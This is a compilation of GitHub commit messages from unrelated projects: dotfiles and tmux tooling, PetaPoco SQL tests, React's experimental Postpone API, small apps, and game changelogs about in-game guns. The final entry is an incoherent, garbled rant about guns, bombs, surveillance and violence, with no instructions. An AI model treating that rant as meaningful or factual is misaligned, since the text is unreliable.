142bd74 Not need executable bit anymore
e628de4 Don't run nmk-update when use git
baf1169 Change directory to home before extract
3d38d90 Make nmk-update work without python2
d55f3e1 Find binary absolute path using shutil.which on python 3.3 and later
fa5e734 Remove nvim function
005e8ae Show url to lastest tag
761c464 Revert "Fix Konsole print q"
d1e32a8 Fix Konsole print q
ed6168c No set neo if EDITOR is unset
3c5e21e vim: only set system clipboard if exists
7e34267 vim: save to tmux buffer
38eec15 Add gcloud as default
a46b7bc Update ssh keys
14ec0fc update docs
f81a377 Update submodule and node
66769de Chose new face color
2ba4a9a Add tmux 2.7
d7f5152 Add zsh fpath
9e5e70f Add update alternative note
8ef6259 Move unique path to almost the end of .zshrc
69dcad9 Added -l, --login to start zsh login shell instead of tmux
7b02523 Bring back switch pane
3498bde F4 to choose tree
f300766 Remap key and set base index to 1
0f05e14 Rebind tmux function key maps
7127949 Fix bug with xz
2cfde6f nmk-update.py can update from file
1b0378b Handle error on build
b7b5f2f Press F2 switch to last session
9b72dcc Preserve for tmux vertical line
063cb3a Reorder files
bb666f3 Print archive path if not clean up
3a00708 Move nmk-merge to bin directory
adbdd77 Try new base_color on remote session
abbb891 Remove misleading comment
84bc5e3 Alias neo to $EDITOR
5fd2615 Update six.py
0b7897d Extend TMOUT
80b3174 Update unmaintained vim plugins
a8f6b10 Guard nmk-merge
8111263 Update 8bit color mode
3206e56 Drop tmux 1.8 1.9 2.0 config & Change C-L mapping
9d62c90 Use same color in remote session
898a60d Extend TMOUT
9e7f0db Add fix for ubuntu 18.04
5ecaf4c Bring back PageUp to enter copy mode
de51a3b Rename prompt setting
29b3b19 Show idle time
14f0078 Add nmk-merge
a4dab11 Extend TMOUT if less than 3600
d7bfc69 Add reference and remove not necessary command
849a765 Shorten url
f8c3d39 Add reset function to reset tmux and zsh window after cat binary file
ff723c4 Change bucket name
5acd8cc Fix leak variable
a73b57d Use copy-mode -e if tmux support
c2b8ac2 Fix LD_LIBRARY_PATH not setup properly for local tmux
f006e43 Fix leak variable in prompt
0fed316 Fix buggy PageUp PageDown
9becb16 Update git submodule and node packages
8505787 Update submodules and node packages
b9d6aa5 Update docker generated name
dba9345 Update python six
769eea2 Select kubectl context by env
aea45fc Fix bug gcloud completion not load on server
808ffff Remove gcloud from profile path, use apt-get install method
73213c5 update completion files at login
94a3cca Add newline to rf output
2a4fbaa Update
005ea0a Upgrade zsh submodules
da78824 Rename function, prevent autocomplete
3a6bb1a Refactor hook
8e6dabc Add hook precmd
ff6e3f1 Change yaml indent
8b73e3e Update npm packages and git submodules
82980d5 Update submodules and node packages
7b2c4db Change bucket
60b9c23 Add git rebase alias
d30ab0f Update tapable
aafd83c Update git submodules
44c5ba5 Update git submodules
74073b2 Upgrade node packages
4e072a8 Switch to ack.vim since ag.vim is deprecated
b6eb1f1 Update git submodules and node packages
422a514 Bring back tmux zoom pane (F5) binding
ab488ef Added support for tmux 2.6
90b7603 Update git submodules and node packages
0c81514 Remove mm aliases
670c03e Refactor zsh prompt
7b18e7b Remove NMK_AUTOLOAD
8cc844e Remove nmk.zsh
1053cb7 Clarify why $NMK_ZPROFILE_SOURCED is set
43e43e2 Update git submodules and node packages
5720de4 Minor refactor
7baf9b3 Use system python
fb09634 Report if $NMK_PYTHON is not found
503f809 Check before insert
42cc4fc nmk alias
1cfadc2 Change logging message
0d288a3 typeset -U path already did this
0fccafb PATH is not prepend with $VIRTUAL_ENV/bin when using pyenv
27233f5 C.UTF-8
96f7b96 Refactor and remove an unused function
cd81c64 Refactor
e1fe121 Log number of used processes during initialization
7044696 Refactor to use builtins if possible
68f68a0 Consistent style
fa14393 Not need anymore
cae6aee Typo
9420339 Simplify nvim alias
3f17c2d Removed unused settings
a0ba3fa Update git submodules
fd11722 Remove external command calls
2571feb Reduce number of external command calls
32440f2 extract cleanup function
55f7ebc Cleanup on interrupt
3853329 Fix mistake in refactoring
d749f5e Refactor
26fa288 Change prompt color to yellow in remote session
35f11db Replaced hard coded cyan with $horizontal[base_color]
523678f Don't need it
42697b2 Typo
00f316c Exclude ./vim/update-plugins from bundle
503241c Update node packages, zsh submodules, and external dependencies
d32a7c5 Change downloader to curl
8516967 Fix clean-unused-kernels doesn't remove some unused packages
830c77c Add nginx.vim
763ea75 Use alive apt-cacher image, use volume instead of volume container
9fef5b4 Moved some variables into horizontal (associative array)
e570a32 This is not need anymore
85d6d3e Fix bug in raspberry pi
38277e7 Fix inccommand error
e984073 Detect neovim using builtin
0c7eed0 Refactor nmk script
cb695ec Ensure that xclip can copy to system clipboard
4812781 Update nmk alias
70fc2e0 Migrate clean-unused-kernels to python3
569d5ce vim: shows the effects of a command incrementally, as you type
afb193d Update node packages
65d591f Prefer python3
8655f72 Remove __pycache__
5c43c96 Ternary conditional
4329b82 Use ternary conditional
f1632df Choose latest stable release by default
0bf60ab Update default template
cb9eed4 Refactor function keyword and rf can resolve relative path
809db50 Update node packages and git submodules
a91a65d Unbind F5 and disable custom key table
dd61085 Refactor nmk.py
880b2f7 Don't generate tmux 2.4 config
c6a0054 Tmux 2.5
48b0b2e Refactor nmk.py
7de4bd4 Update vim pathogen
d91a9d1 Update node packages
8c6a669 Add --inception
875efb0 nmk-update.py: Display log levelname
592d1b4 AUTO_PUSHD
c3ca1bb Disable flow control by using zsh builtin
f53a878 Change setopt case to match documentation
c1231d1 pushd/popd refactoring
d6743f1 Fix python 3 compatibility
9ead6f8 Change message
18ff652 Change ssh-command.sh -> etc/ssh-entrypoint.sh
870115c Edit alias comment
f5dbdb0 Rewrite readme
57c8567 Add installation step without git
1d1031f Interactive choose github release and less verbose log
8a52edf Update submodules and node package
be8ddfc Don't use zsh function keyword
b98e317 Exclude vim-go from vim plugins
2cfb19d Add description to nmk alias
c677b69 Refactor and rename build script
949e2e2 Update node packages
04000e7 Refactor and add --no-upload
f1db866 How can I forget python as dependency
f7a7737 build-and-deploy: fix typo
14ac0f6 Try nmk alias without exec
ddf7e3a Ensure always log remote branch name
4317625 Refactor `rf` to use single print statement
5b2b307 `rf` function detect tmux and xclip correctly
2bacc82 rf always print output, and avoid using tee command
941e7ef Change history limit for both zsh and tmux
43b058c Add -k option to not remove temporary directories
21739ec Update node packages
0a8e27b Move files and delete some scripts
aed8289 Refactor to use same convention
2819edb Put branch name in BUILD_INFO
1ddaa53 Refactoring
f5b3b2d Merge build related files into one
550de84 Set modification time to now
b56aa88 Swap options order
19342c0 Create release using remote tracking branch as default branch
96e52c8 Explicit said that nmk-update.py need to be compatible with python 2.6.6
3325146 Don't need sha256sum signature
6381dbe Can create release from custom branch, no more master force push
5cb595a curl automate setup
70412cf I think `linux` TERM doesn't support 256 colors
6aac06d Fix parent directory permission change cause centos login fail
0441074 Refactor update script, don't download gcloud if up-to-date
fcb1a91 One script release all
edbefd6 Update from / bundle to google cloud
b2b450b Add script to append bash alias
c76b0c5 Delete unnecessary code
ce7e8eb Tmux server-info change in 2.4, use list-sessions to check server existent instead
06e4d8b Fix deactivate in pyenv-virtualenv
c558209 Fix bug in TmuxCompiler
d5cce06 Tmux 2.4
789544d Remove tmpdir after close dolphin
4c3fe7e Update git submodules
fd9520a Fix unknown option: history-file
fd5bcc1 Stop display pyenv python version
0c5d71b Add support for pyenv-virtualenv and consider use it
814b075 Correct comment in README.md
a1d8d9a NMK_IGNORE_LOCAL is useless
c7fc5ac ignore zsh/completion
656d1c0 Rewrite .gitignore
eb9aef6 Revert "Allow zsh local completion"
c092e21 Move zshrc.src -> src/zshrc
b6382ef Clean up .gitignore
eae9e5d Allow zsh local completion
8011e05 Fix return status
ef79866 Join zshrc sources by os.EOL
2921aec Forget to remove new keyword
9056a45 Replace Function.apply with array spread. No need node 4 support
19db32d Refactor, remove => delete
b1ee263 Support Node 6.10.0 and later
663642b Add watching class
9ba6b92 Yarn
ba067c4 Refactor Tmux to use Tapable
ef053d1 Bind path.join's this to null doesn't look correct
8814cdb Upgrade submodules
bbafd15 Change wording
943731b Remove flow interfaces
5a3bb5e Rename async for future compatibility
6a81308 Log detail in nmk.py
eb814a4 Move Zsh.js and Tmux.js
fb1c61a A little mistake
4777708 Create base class, Compiler
2241dad Refactor to use call instead of bind, because we call it immediately
e912ae5 Guard zshrc.pre with NMK_IGNORE_LOCAL
413b91a Remove never used NMK_ZSHRC_EXTRA
e5d87b2 Refactor tmux and zsh renderer scripts
1abced8 Revert "delete no longer used script (it doesn't work)"
1ddc27b Update node packages
61c64e5 Revert "Fix bug in tmux 2.1"
ccdcae4 Fix bug in tmux 2.1
5d5975e Add bundle script
cd112b2 delete no longer used script (it doesn't work)
9ff7102 Refactor
273eaff Source zsh-syntax-highlighting at the end of the zshrc
1622e46 Change vim solarized color
1dbbda6 Remove rarely use plugins
abf9313 Update outdated document
62c5319 Remove post-clone script
04d3294 Remove no longer used script, move to github release
b6a1dd4 Pretty print release info
2415dda Get rid of NMK_RESPAWN_PANE_DIR, just use tmux respawn-pane
ca78ecf Update submodule on reset
527e42b Update nod packages and git submodules
b0ee132 Update python six
fbc759a Refactor nmk.py
d26b163 Save tmux history
e5ac46c Update docker-clear-containers
89707af Update node packages
fceafbc Use os.execvp
0bc1f2a Update ssh public keys
a49a382 More quiet when scripting
41f5178 Update readme
8a1c03b Goodbye TS
7c77554 Update node packages
18dd141 Update git submodule
8210ef0 Only declare SSH_AUTH_SOCK in desktop environment
bdf5d7b Special page up and page down behavior
9cc6e34 Upgrade node packages and zsh plugins
1a218d6 Smarter page up and page down
50fef53 Update node package and zsh submodules
b12ff59 update docker generated names
aa96e18 update pathogen
5ac8c2e Update node packages
2f85ca9 Upgrade zsh and npm packages
301c570 Add raspberry pi watch temp
ce3416b Upgrade npm and yarn packages
ab5ec61 Use 256 colors on linux virtual console and add argument to disable it
f454421 Change Ctrl-B to ^B
8cba938 Set dvorak option
f118fbc Refactor update script
4e11a9f Can select release to update
58c26f4 Add back environment and the reason for it
0be1cfc Pipe rf output to tmux buffer
8e1b951 No require readlink for rf function
19d04e8 Clean up left over from docker-zsh-completion
3715046 Why is zsh/plugins folder ignored - -'
a1b25c0 Remove unnecessary export, add rust path
895ac48 Remove docker-zsh-completion
14237db Upgrade npm and yarn packages
2a9009d tmux: Change wording for prefix key status to Ctrl-B
ba423ac Refactor
bb0e12d Better log and filename
0d5dd94 Change release json path
c964019 Don't download bundle if already up to date
98eeec7 grst to delete tags and update branches
9f6d1bb Show more last commit
b495778 Update bundle.sh
dc85184 Remove old update script
3a0c489 Add python update script
5cde930 Change RECENT_COMMITS to LAST_10_COMMITS
e3bdf99 rf also copy to clipboard
a8c3378 Add dksp alias
1499527 Convert git-reset-to-remote-branch to function
f7555a3 Add more powershell git alias
49ecf6a Powershell lol alias support arguments
6249be4 Add powershell gpr alias
3acb8fd Replace git-fetch-rebase with `git pull --rebase`
2bb8eba Add recent commit info into bundle
0480365 Add vim file type guide
de2ac4a Clean up docker aliases
44bbde9 Rename tar excluded file list
113f062 Remove .dockerignore
27bff80 Squash commits

---
## [Ste1io/PetaPoco](https://github.com/Ste1io/PetaPoco)@[8fd5cb7983...](https://github.com/Ste1io/PetaPoco/commit/8fd5cb79838466eed26d5574da2f539ac803e29c)
#### Wednesday 2023-09-27 17:38:46 by Stelio Kontos

I hate my life:
- QueryMultiple tests use an MSSQL-specific statement for concatonating possibly-null strings
- each dbms uses their own flavor of string concatonation: "+", "||", and "CONCAT(...)"
- they also use different syntax (and placement) for limiting results: TOP n, FIRST n, LIMIT n
- postgres requires the passed-in parameter type to match the column type: "1" != 1

Solution:
- move tests back to MSSQL
- create failing test in base class to force implementation in each derived class
- churn out 28 f'ing test overrides
- change Id data type for "JoinableX" tables (ms access only) to int, since I was derping when I changed it to GUID

Result: life still sucks
- 8 of 28 QueryMultiple tests fail

Pushing this commit to remote anyway with the faint hope that some sql genius smarter than myself has a couple pennies to toss my direction on this. Failing tests have failure reason above them in "// FIXME:" comments:
- Firebird (multiple statements in a single command)
- MS Access (possible bad syntax)
- MySql & friends (incorrect result count)

---
## [gnoff/react](https://github.com/gnoff/react)@[ac1a16c67e...](https://github.com/gnoff/react/commit/ac1a16c67e268fcb2c52e91717cbc918c7c24446)
#### Wednesday 2023-09-27 17:40:13 by Sebastian Markbåge

Add Postpone API (#27238)

This adds an experimental `unstable_postpone(reason)` API.

Currently we don't have a way to model effectively an Infinite Promise.
I.e. something that suspends but never resolves. The reason this is
useful is because you might have something else that unblocks it later.
E.g. by updating in place later, or by client rendering.

On the client this works to model as an Infinite Promise (in fact,
that's what this implementation does). However, in Fizz and Flight that
doesn't work because the stream needs to end at some point. We don't
have any way of knowing that we're suspended on infinite promises. It's
not enough to tag the promises because you could await those and thus
creating new promises. The only way we really have to signal this
through a series of indirections like async functions, is by throwing.
It's not 100% safe because these values can be caught but it's the best
we can do.

Effectively `postpone(reason)` behaves like a built-in [Catch
Boundary](https://github.com/facebook/react/pull/26854). It's like
`raise(Postpone, reason)` except it's built-in so it needs to be able to
be encoded and caught by Suspense boundaries.

In Flight and Fizz these behave pretty much the same as errors. Flight
just forwards it to retrigger on the client. In Fizz they just trigger
client rendering which itself might just postpone again or fill in the
value. The difference is how they get logged.

In Flight and Fizz they log to `onPostpone(reason)` instead of
`onError(error)`. This log is meant to help find deopts on the server
like finding places where you fall back to client rendering. The reason
that you pass in is for that purpose to help the reason for any deopts.

I do track the stack trace in DEV but I don't currently expose it to
`onPostpone`. This seems like a limitation. It might be better to expose
the Postpone object which is an Error object but that's more of an
implementation detail. I could also pass it as a second argument.

On the client after hydration they don't get passed to
`onRecoverableError`. There's no global `onPostpone` API to capture
postponed things on the client just like there's no `onError`. At that
point it's just assumed to be intentional. It doesn't have any `digest`
or reason passed to the client since it's not logged.

There are some hacky solutions that currently just tries to reuse as
much of the existing code as possible but should be more properly
implemented.
- Fiber is currently just converting it to a fake Promise object so that
it behaves like an infinite Promise.
- Fizz is encoding the magic digest string `"POSTPONE"` in the HTML so
we know to ignore it but it should probably just be something neater
that doesn't share namespace with digests.

Next I plan on using this in the `/static` entry points for additional
features.

Why "postpone"? It's basically a synonym to "defer" but we plan on using
"defer" for other purposes and it's overloaded anyway.

---
## [galacticcoders/PromiseOfPower](https://github.com/galacticcoders/PromiseOfPower)@[eb74363195...](https://github.com/galacticcoders/PromiseOfPower/commit/eb743631959ccb89573d39e1c8be62f069caff0a)
#### Wednesday 2023-09-27 17:42:27 by dcx86

Conjure Unholy PromiseOfPower Grimoire

    In the dark annals of forbidden knowledge, a new eldritch creation takes form—PromiseOfPower.
    Crafted in the accursed language of SwiftUI, this abomination serves as a dread companion
    to those who dare partake in the Eldritch Horror board game.

    Unspeakable Additions:

    - Scribed malevolent mock data into the Book of Shadows, breathing life into artifacts, assets, conditions,
      spells, and unique assets.

    - Unveiled the horrors of other dimensions, allowing the cursed to traverse these realms by merely
      swiping their fingers upon the screen—each cursed slide met with uncanny haptic reverberations.

    - The mere touch upon these digital talismans now blurs the visage, revealing yet another layer of
      the unfathomable—accompanied by ominous tactile vibrations.

    - A grim sigil now lurks in the screen's uppermost corner, tempting users to refine their dark journey
      by traits—whether seeking 'ally', 'item', 'service' or other sinister archetypes.

    - The accursed words "Brought to you by GalacticCoders" appear as if whispered by unseen entities,
      their message accompanied by a spine-chilling melody of dread.

    Inscribe these words into your consciousness: this grotesque app aims to serve as a looking glass
    into otherworldly terrors and unnameable wonders. It shrouds the user in the velvety darkness of
    the Lovecraftian cosmos, and imbues the experience with a veneer of interactive dread.

---
## [Ajeya10/MUSIC-APP](https://github.com/Ajeya10/MUSIC-APP)@[94acc3e000...](https://github.com/Ajeya10/MUSIC-APP/commit/94acc3e0009c72805db63aababed4e5516b7aa49)
#### Wednesday 2023-09-27 17:53:19 by Ajeya10

music.md

GrooveTunes - Your Ultimate Music Experience
Introducing GrooveTunes - A Music App with HTML, CSS, and JavaScript

Welcome to GrooveTunes, a dynamic music application designed to deliver a seamless and immersive musical experience. Built using HTML, CSS, and JavaScript, GrooveTunes offers a modern platform for music enthusiasts to explore, discover, and enjoy their favorite tunes.

Key Features:
Intuitive User Interface: GrooveTunes boasts a clean and user-friendly design, ensuring effortless navigation and an enjoyable user experience.

Dynamic Playlist Management: Create, edit, and organize playlists on-the-fly, providing users with a personalized and customizable music library.

Real-time Search: Instantly find songs, albums, and artists with our lightning-fast search functionality, powered by JavaScript.

Responsive Design: GrooveTunes adapts seamlessly to various screen sizes, offering a consistent experience across desktops, tablets, and mobile devices.

Audio Equalizer: Fine-tune your listening experience with a built-in audio equalizer, allowing users to adjust bass, treble, and more.

Cross-Browser Compatibility: GrooveTunes is compatible with all major web browsers, ensuring accessibility for a wide audience.

Play History: Keep track of your listening history and revisit your favorite tracks with ease.

---
## [MemedHams/CEV-Eris](https://github.com/MemedHams/CEV-Eris)@[b92562ad8f...](https://github.com/MemedHams/CEV-Eris/commit/b92562ad8f26c2354730f8a013195a90bbfbe9fd)
#### Wednesday 2023-09-27 17:55:23 by ValoTheValo

Makes the "Gun" Not spawn in maint, makes MK58 fit in holsters (#8200)

* changes item path to be consistent

i hate kegdo

* kegdo code moment

what fucking moron designed this

* fixes MK58 not fitting in holster

pain

* Update holster.dm

* kegdo moment

---
## [caligari87/Ugly-as-Sin](https://github.com/caligari87/Ugly-as-Sin)@[8674c401cc...](https://github.com/caligari87/Ugly-as-Sin/commit/8674c401ccd397c8c9770b1c4cb25c8947414723)
#### Wednesday 2023-09-27 18:09:01 by dastrukar

Port over uas-medical experimental

The following is all the commits from the experimental branch of uas-medical:
(command used: git log --pretty="[%h] %s")
[e0332a3] menudef: Update keybinds
[8ff7833] bandage: Add strip button
[5e83c4d] wound: clamp pressure to max 8
[6a85593] bandage: Don't add more pressure if wound isn't properly bandaged yet
[a6ad614] bandage: Change grid colour to match the patient's
[907764d] bandage: Add hudscale cvar
[2ccb7fc] wheel: Check owner
[6954137] bandage: show different symbol if sealed
[cea6832] Update readme.md
[5c68962] traumakit: adjust toolList position
[86866ce] wound: increase pressure loss rate
[8679588] bandage: suck a bit more
[948703c] wounds: reset pressure if not patched
[bc5997c] bandage: overhaul ui a bit
[fc71558] bandage: replace lorem ipsum
[062acc5] bandage: Improve flavour text a bit more
[53001d2] bandage: Actually add proper helptext
[c84843f] bandage: be more lenient with ismoving
[8a36030] bandage: clean up drawwound
[b6d12bb] bandage: clamp pressure percentage
[ab447da] woundhandler: Fix UpdateWound not updating currentWound correctly
[ac64a1d] wound: init oldPatched
[cf6a1ef] bandage: don't try to use bandage if holding firemode
[b482006] bandage: Check if fully covered
[c440007] wound: Allow incap bandaging
[219cf9f] wound: handle patched wounds and properly inherit source
[d957176] bandage: Can't bandage and move at the same time
[3842870] bandage: Apply effects on the correct target
[ecb973c] bandage: Use dark gray for flavour text
[82d378b] bandage: Show patient name
[df8d791] bandage: show flavour text :]
[b66fae0] bandage: oops
[2f40f90] bandage: clamp wound position
[7c03bb8] bandage: Add option to rip bloodbag
[0fbd86c] bandage: Separate bandage action into its own module
[44b5e63] bandage: Add base tool info and a bit of helptext
[68ca59e] traumakit: don't colour the "but"
[fcb4855] woundhandler: Better currentWound updater
[6edefb0] woundhandler: Unify wound cycling logic
[c40df82] Synchronise currentWound across all tools
[607cb18] Indicate how open the wound is, even when bandaged
[04b6a22] traumakit: properly offset text when bandaged
[bbcb35d] bandage: Use GetStatusColor
[b436e6d] traumakit: Hide wound info when bandaged and show wound stability
[2378472] bandage: properly position wounds
[ed0b572] bandage: Show how stable the wound is
[6dec9ea] bandage: Adjust colours
[9bcfe1d] wound: Override ComeUndone
[f396171] bandage: add more hud info
[8435f5b] bandage: Adjust hud positions
[848f5f7] wound: Make pressure loss based on how fast you're moving
[7549cf6] wound: Properly check for IsMoving
[128e6e4] bandage: Tint wounds depending on pressure
[001048e] bandage: Separate hud function
[3fb1b50] Sort files
[7a4f179] traumakit: Prevent operating on a bandaged wound
[06a42d2] traumakit: Formatting
[38f8258] move HandleStrip back to traumakit
[6b13fca] bandage: slightly reduce max pressure applied
[118d14f] bandage: Reset action if you switched wounds
[af9f6ad] Remove stabilizer
[a72dc07] bandage: Add option to rip bandage
[75a090c] bandage: fix crash
[24fb8c6] bandage: Try to make it more obvious which wound is selected
[c37bcc5] bandage: Fix effects not triggering
[5ba14a2] wounds: Stability affects bleeding
[13f56fd] wound: decrease pressure faster if you're moving
[d5dc8af] Update stabilisation formula and make pressure less annoying to maintain
[23db6b2] bandage: Attempt to fix audio
[ca742c5] bandage: debug hud
[21acfea] bandage: Fix bandage progression being wrong and tweak effect
[da3f603] bandage: Restore effects
[0f87802] bandage: Tidy up some stuff and fix selected wound layering issue
[d1d07cd] bandage: Tidy up grid code a bit
[87cf432] bandage: Allow wound selection
[c35fdb1] bandage: Inherit UaS_MedicalTool
[3317e8b] Update zscript.zsc
[0e0ded6] rename bandage file
[01681a5] traumakit: use parent's DoEffect to init some stuff
[5a6cebd] Create a base class for medical tools that behave like the trauma kit
[a42b6e0] bandage: Implement rough hud
[32e2886] wound: add comments and make bandage come undone if pressure is too low
[d3d870a] [WIP] pressure and stabilisation changes
[bf82e55] Semi-working bandage
[ea43cab] unfinished commit
[1549e04] wheel: Better scaling and configurable options
[1e755bb] Wheel: remove pointless variables
[c37b8e1] Better item wheel controls and better collision detection
[37a157e] traumakit: Add inverted cycling
[f3acb57] menudef: actually use the correct cvar for altcontrols
[b56a43c] Update readme.md
[e30fef8] traumakit: Adjust cavity status values
[3b39d55] stabilize: Show whether you have open wounds on the HUD
[dd20b15] traumakit: Allow switching to Mag. Manager
[610aab7] wound: Nerf regenrate
[0364725] traumakit: Actually fix alt controls
[13c9e88] Revert "traumakit: Better alt controls logic check"
[d39f4a1] wheel: Clean up some unused stuff
[a761a70] scalpel: Don't use painkiller for getting wound size
[f759c87] Update menudef.txt
[23d7353] traumakit: Better alt controls logic check
[787b1a0] traumakit: Fix some oversights with tool switching
[4b33836] trk: Update helptext
[4970b1e] traumakit: Add alternative control scheme for wheel
[b7b63df] Update readme.md
[f3a8617] traumakit: Add item wheel
[b2c96e9] traumakit: Make staplers not so effective
[0da32fc] traumakit: Fix sutures not working
[8e7428a] wound: Less harsh cavities
[12a2fc7] wounds: Only heal tissue damage if the wound was in good condition
[9f517bd] Update readme.md
[65f70ad] scalpel: fix oversight
[e578340] scalpel: less harsh tissue damage
[abd2ef0] scalpel: Deal tissue damage as well
[c299986] wounds: Heal a random amount of tissue damage when healed
[e7699d9] traumakit: Add options to quick swap
[a7c75ad] Update readme.md
[f8b7785] traumakit: Actually use the correct icons
[06d9177] traumakit: Add icons to tool list
[c969a43] Update readme.md
[7e821c8] traumakit: Add tool list to HUD
[89815bf] sutures: Seal, not bandage
[383295c] WoundHandler: Only tell new wounds if debug is true
[405e482] Use HDBleedingWound and refactor some stuff
[19cb6af] Add debug hud cvar
[bec4bdf] forceps: Deal less cavity damage
[c419d73] readme: remove false fact
[e612b7b] debug: More fancy info
[da32eb0] traumakit: Actually cause pain
[bff73e9] stabilize: Add null check
[01cf0fb] scalpel: Create harsher wounds
[b25f9fa] readme: add more info
[f5c143b] scalpel: Randomise wound damage
[3bd55c0] Adjust heal amount
[c7703b4] Adjust cavity related stuff
[2d51b9a] Add disclaimer
[201047b] Initial commit

---
## [lessthnthree/effigy-se](https://github.com/lessthnthree/effigy-se)@[a8edd9004f...](https://github.com/lessthnthree/effigy-se/commit/a8edd9004f1875bd3be409e2f382933a74bf8a40)
#### Wednesday 2023-09-27 18:09:12 by carlarctg

Gun kits don't need cable coil or tools, halved crafting time (#78419)

## About The Pull Request

Crafting R&D guns from gun kits no longer requires tools or cable coil.
The decloner and energy crossbow still need reagents.

Halved R&D gun crafting time. 20->10 seconds.

## Why It's Good For The Game

These changes were made a long, long while ago and honestly while I
understand gun kits I don't understand why it was made So. Annoying. To
make the fucking guns once you got everything ready. It makes it a total
annoyance. You spent 40 minutes getting all the tech for it, you
shouldn't have to also get tools and cables and wait 20 seconds standing
still.

Anyone who has played ingame like any time after that change can attest
how underused any R&D gun is now. X-ray laser guns still DESTROY blobs
but people don't even THINK about them because of the dumb annoying
recipe (alongside RnD being a pain now).

Simply put this just. Makes life easier for security officers. And
reduces tool dependency.

## Changelog

:cl:
qol: Crafting R&D guns from gun kits no longer requires tools or cable
coil. The decloner and energy crossbow still need reagents.
qol: Halved R&D gun crafting time. 20->10 seconds.
/:cl:

---
## [lessthnthree/effigy-se](https://github.com/lessthnthree/effigy-se)@[68b6c1fa75...](https://github.com/lessthnthree/effigy-se/commit/68b6c1fa753a4ae33cbe2d2a603041db4abdc7cf)
#### Wednesday 2023-09-27 18:09:12 by RikuTheKiller

Rounded supermatter delamination times to 5 seconds, restored old mood messages (#78335)

<!-- Write **BELOW** The Headers and **ABOVE** The comments else it may
not be viewable. -->
<!-- You can view Contributing.MD for a detailed description of the pull
request process. -->

## About The Pull Request

Makes the supermatter delaminate in 15 seconds instead of 13 and 5
seconds instead of 3 if a sliver has been taken from it, mainly to
please perfectionists (me and some others who commented on the PR) as
well as giving people at least a chance to escape delam round removal.

I don't like it when flavorful text is replaced by bland and
not-as-funny alternatives.
Also, how the hell is it gamey for staff to know the engineers are in
charge of the power?
It's honestly more gamey for them to know what a resonance cascade or
supermatter delamination is, so I'd say you've done the opposite of what
the goal was with the message changes on top of making them less fun in
general. I disapprove.

Oh, yeah, and the SM now reports the times correctly due to it reporting
them every 5 seconds, meaning people would only see the 10 second
announcement. Now there is going to be a 15 second announcement as well.

<!-- Describe The Pull Request. Please be sure every change is
documented or this can delay review and even discourage maintainers from
merging your PR! -->

## Why It's Good For The Game

Watering down messages to be bland is just, like, less fun, ya know?
I didn't see a single person in support of the message changes apart
from the PR author, everyone else was just complaining about them,
including myself.

Also, several people mentioned the fact it could just be 15 instead of
13 for a nice round number, including myself. I also made the sliver
delamination time 5 seconds instead of 3 seconds because you pretty much
can't get out in time, especially if the game is laggy. 3 - 5 people
being round removed because of one traitor objective with no chance to
escape it is just bad gameplay.

Oh, and, bugfix good, I suppose.

<!-- Argue for the merits of your changes and how they benefit the game,
especially if they are controversial and/or far reaching. If you can't
actually explain WHY what you are doing will improve the game, then it
probably isn't good for the game in the first place. -->

## Changelog

<!-- If your PR modifies aspects of the game that can be concretely
observed by players or admins you should add a changelog. If your change
does NOT meet this description, remove this section. Be sure to properly
mark your PRs to prevent unnecessary GBP loss. You can read up on GBP
and it's effects on PRs in the tgstation guides for contributors. Please
note that maintainers freely reserve the right to remove and add tags
should they deem it appropriate. You can attempt to finagle the system
all you want, but it's best to shoot for clear communication right off
the bat. -->

:cl:
balance: Supermatter now takes 15 seconds to delaminate normally and 5
if a sliver has been taken from it. Gives a little more time to escape
in the case of the sliver and also evens out the times to please
perfectionists.
fix: Supermatter now accurately reports it's detonation time.
spellcheck: Supermatter mood descriptions have been reverted back to
their old, more flavorful selves.
/:cl:

<!-- Both :cl:'s are required for the changelog to work! You can put
your name to the right of the first :cl: if you want to overwrite your
GitHub username as author ingame. -->
<!-- You can use multiple of the same prefix (they're only used for the
icon ingame) and delete the unneeded ones. Despite some of the tags,
changelogs should generally represent how a player might be affected by
the changes rather than a summary of the PR's contents. -->

---
## [shauntmcgovern/Removed-AllVi8lenceANDPrototypes_InciMSDT_OpenSourceG-TTTx](https://github.com/shauntmcgovern/Removed-AllVi8lenceANDPrototypes_InciMSDT_OpenSourceG-TTTx)@[c6b6f3a19e...](https://github.com/shauntmcgovern/Removed-AllVi8lenceANDPrototypes_InciMSDT_OpenSourceG-TTTx/commit/c6b6f3a19e5167bf490f6a49841009b420e78c24)
#### Wednesday 2023-09-27 18:13:31 by 89*B(u)nd*9.0:;y(xui':'?/?0?:)0;"bt bt bt "xxix xtxx xiix xitx tixx iiitx xii xiix btbtbt"{|bt'bt?bt/bt?bt/bt'bt"|'|||v*' ttttttttttittttttttttttttttttttittttttttttttttttttttttttttttttittttttttttttttttttttttttttttttttttttttttitttttttttttttttttttttttixL.bt

guncrimephysiclcrimeAngelcontinuestolead(I)nter(C)

..protective forces..>>?/
I'm Jesus>.
let it be a human television or Instagram or even this Face
that our current digital abilities would and will
(kind) of human weapon.
every (kind)s of weapons until our protection services
our current now for the foreseeable future--understood human digital precept, and scientific knowing.
Angel's lead and designation
("7scVictim[s]"/7sc_0:)b'ttm'\mm:z/?"?/{+'=}[/=+']:'|':\:;?\z:;"'{P'}[O:P'}+'svzcs_1':s'Human Victims'.
 the killing piece
Con(sis)ting'Of
 exact located[];
?/
..This is the definition of finding a specific chemical compound. What is that. But the very makings of a gun, a pistol, an assault rifle, a household house-made self-made do it yourself type kind of bomb, or even a collection of all and known ways to make explosives. Leaving the human race in complete peril and suffering the grotesque effects that have come from those very types of causes. The lead in a pistol, the lead in a gun, the gunpowder around the bullets that are lodged in that so-gun. It would take on a very different chemical composition then say a human pole which is a light fixture in your community currently holding up the police activity "second-watch," the necessary surveillance of what this community needs in its society and what is then taking place. For it records the ongoing activity 24/7/365/3600 and of what we so choose and the community thinks that the local police are then watching our every move after watching the millions of hours of recorded video'tape across this nation and they are only in select questionable often suspicionable areas of the your community"'you know the hoods which are the ghettos stricken with poverty and various human openings for any type of violence, gun crime, physical crime. The violence of that type is exactly what we are trying to determine on a meta-physical--laser-sight--ecclesiastical branch type of human thought that is already scientifically understood and from there once, it, comes on-and receives 'its' above 38: warnings and above just below and right at the exact time leading to and the multiple physical altercations and some criminals are showcasing invincibility and 'lawful' 'due' 'diligence' 'inv'incibility which is the coward in its ownnature and we all know in the street, the blade of the coward that the coward then uses, openly, always will finish first and come last to the dire mortal outcomes leaving the "good doers" which I thought tha(t) would be us, in this regard, because (us) human protectors can only move in any form of rightful lawful self-defense and any form of outlaw logic taking place and the lawful regurgitation that happens in response or the human individual, which is the 'U.S." citizen in this case, has to take its protective lawful reasoning forces into its own hands because 